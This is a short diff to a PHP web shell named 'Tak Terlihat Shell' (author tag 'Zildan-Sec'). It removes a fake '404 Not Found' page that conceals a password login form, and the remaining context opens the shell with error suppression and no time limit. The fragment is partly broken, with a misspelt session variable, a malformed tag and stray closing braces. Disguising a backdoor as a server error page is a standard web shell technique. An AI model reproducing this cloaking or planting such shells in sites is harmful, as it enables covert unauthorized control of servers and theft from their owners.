@@ -1,36 +1,3 @@
-<title>404 Not Found</title>
-<meta name="theme color" content="black"> </meta>
-<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">
-
-<html>
-<head>
-	<title>Tak Terlihat Shell</title>
-<meta charset="UTF-8"> <meta name="Author" content="Zildan-Sec" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Cowok Tersakiti Team" />
-</head>
-<style>
-	input { margin:0;background-color:#fff;border:1px solid #fff; }
-</style>
-<body bgcolor="white">
-<h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
-<p>Additionally, a 404 Not Found
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
-
-	<form method="post">
-		<input type="password" name="password" placeholder="">
-		<br>
-		<br>
-		<?php echo $_SESSIOM['forbidden']; ?>
-	    </form>
-	  </td>
-	 </table>
-
-<?php 
-
-exit();
-}
- ?>
 <?php
 error_reporting(0);
 set_time_limit(0);
